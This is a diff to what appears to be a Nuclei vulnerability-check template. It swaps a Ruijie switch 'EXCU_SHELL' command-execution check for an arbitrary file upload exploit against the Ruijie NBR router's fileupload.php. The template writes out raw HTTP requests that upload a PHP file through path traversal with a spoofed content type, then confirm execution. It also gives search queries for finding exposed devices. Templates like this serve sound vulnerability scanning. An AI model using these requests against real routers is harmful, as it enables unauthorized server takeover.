@@ -1,33 +1,37 @@
 id: Ruijie
 
 info:
-  name: Ruijie Switch WEB Management System EXCU_ SHELL
+  name: Ruijie NBR Router fileupload.php Arbitrary File Upload Vulnerability
   author: Zero Trust Security Attack and Defense Laboratory
   severity: high
   description: |
-    Ruijie Switch WEB Management System EXCU_ SHELL
+    Ruijie NBR router has an arbitrary file upload vulnerability in the fileupload.php file, which allows attackers to upload arbitrary files to the server and obtain server privileges
   metadata:
-    fofa-query: body="img/free_login_ge.gif" && body="./img/login_bg.gif"
-    hunter-query: web.body="img/free_login_ge.gif"&&body="./img/login_bg.gif"
+    fofa-query: app="Ruijie-NBR路由器"
+    hunter-query: web.title="锐捷网络 --NBR路由器--登录界面"
 
 
 http:
   - raw:
       - |
-          GET /EXCU_SHELL HTTP/1.1
+          POST /ddi/server/fileupload.php?uploadDir=../../321&name=test.php HTTP/1.1
           Host: {{Hostname}}
-          User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.2852.74 Safari/537.36
-          Accept-Encoding: gzip, deflate
-          Accept: */*
-          Connection: close
-          Cmdnum: '1'
-          Command1: show running-config
-          Confirm1: n
+          Accept: text/plain, */*; q=0.01
+          Content-Disposition: form-data; name="file"; filename="111.php"
+          Content-Type: image/jpeg
 
+          <?php phpinfo();?>
+      - |
+          GET /321/test.php  HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36
+      
     req-condition: true
     matchers:
       - type: dsl
         dsl:
           - 'status_code_1 == 200'
-          - 'contains(body_1, "configuration")'
+          - 'status_code_2 == 200'
+          - 'contains(body_1, "test.php")'
+          - 'contains(body_2, "PHP Version")'
         condition: and
